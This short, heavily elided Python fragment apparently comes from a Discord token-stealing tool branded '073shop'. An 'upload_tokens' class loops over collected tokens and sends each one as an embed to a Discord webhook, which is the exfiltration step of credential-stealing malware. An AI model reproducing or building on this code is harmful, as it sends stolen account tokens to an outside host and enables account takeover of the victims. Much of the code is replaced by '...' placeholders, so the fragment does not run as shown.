...
class upload_tokens:
    ...
    def upload(self):
        ...
        for token in self.tokens:
            ...
            embed.set_footer(text=".gg/073shop")

            self.webhook.send(embed=embed, username="073", avatar_url="https://cdn.discordapp.com/attachments/1041752606890000514/1084849068657881088/image.png")
